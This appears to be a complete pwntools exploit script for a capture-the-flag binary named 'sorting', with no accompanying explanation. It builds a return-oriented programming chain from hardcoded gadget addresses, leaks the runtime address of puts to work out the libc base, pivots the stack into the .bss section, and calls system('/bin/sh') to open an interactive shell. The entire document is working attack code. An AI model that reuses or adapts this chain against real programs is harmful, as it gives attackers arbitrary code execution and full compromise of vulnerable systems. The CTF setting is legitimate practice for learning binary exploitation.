from pwn import *

libc = ELF("/lib/i386-linux-gnu/libc-2.24.so",False)
elf = ELF("./sorting",False)
ret = 0x08048402
ebp = 0x0804898b
lret = 0x08048545
pret = 0x08048419
pppret = 0x08048989
data = elf.bss(0x700)

r = process("./sorting")

rop = flat([elf.plt['puts'],pret,elf.got['puts']])
rop += flat([elf.plt['read'],pppret,0,data,0x700])
rop += flat([ebp,data-4,lret])
rop = p32(ret)*((0xfc-len(rop))/4)+rop
r.sendafter("book: ", rop)

for i in xrange(16):
    r.sendlineafter(": ", "0")

r.sendlineafter("swap\n", "15 16")
r.sendline("A")

r.recvuntil("exhibit!\n")

libc.address = u32(r.recvline()[:4])-libc.symbols['puts']
print "LIBC: "+hex(libc.address)

rop = flat([libc.symbols['system'],0,next(libc.search("/bin/sh\0"))])
r.send(rop)

r.interactive()
